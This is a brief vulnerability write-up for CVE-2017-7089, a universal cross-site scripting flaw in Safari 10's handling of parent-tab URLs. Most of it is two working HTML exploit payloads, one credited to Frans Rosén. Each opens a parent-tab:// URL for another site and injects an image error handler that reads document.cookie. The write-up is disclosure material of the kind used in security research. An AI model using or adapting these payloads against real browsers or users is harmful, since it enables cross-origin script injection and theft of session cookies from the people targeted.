# CVE-2017-7089

**Impact**: Processing maliciously crafted web content may lead to universal cross site scripting

**Description**: A logic issue existed in the handling of the parent-tab. This issue was addressed with improved state management.

#### Safari 10

##### Local SOP bypass

```html
<script> function Pew(){var doc=open('parent-tab://apple.com');doc.document.body.innerHTML='<img src=q onerror=alert(document.cookie)>';}</script><button onclick=Pew();>Click me!</button>
```
##### Exploit by Frans Rosén
```html
data:text/html,<script>function y(){x=open('parent-tab://google.com','_top'),x.document.body.innerHTML='<img/src=""onerror="alert(document.cookie)">'};setTimeout(y,100)</script>
```
